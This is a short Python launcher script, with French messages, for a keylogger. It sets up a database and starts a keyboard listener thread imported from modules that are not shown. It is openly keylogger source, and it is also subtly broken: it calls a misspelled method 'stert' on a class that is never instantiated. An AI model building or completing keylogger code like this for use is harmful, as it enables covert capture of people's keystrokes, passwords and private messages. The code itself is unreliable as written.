import threading
import time
import sys

from logger import con
from listener import KeyLogger

# ── DÉMARRAGE ────────────────────────────────────────────────

def main(): 
    print("=" * 40)
    print(" Keylogger-démarage")
    print("=" * 40)


    con()
    print("[*] base de donné ready")

    kl = KeyLogger
    listener_thread = threading.Thread(target=kl.stert)
    listener_thread.daemon = True

    listener_thread.start()
    print("[*] listener clavier démarré")

    print("[*] Tout est en marche — Ctrl+C pour arrêter\n")

    try:
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n[*] Ctrl+C détecté — arrêt en cours...")
        kl.stop()
        print("[*] Arrêté proprement. À bientôt.")
        sys.exit(0)

if __name__ == "__main__":
    main()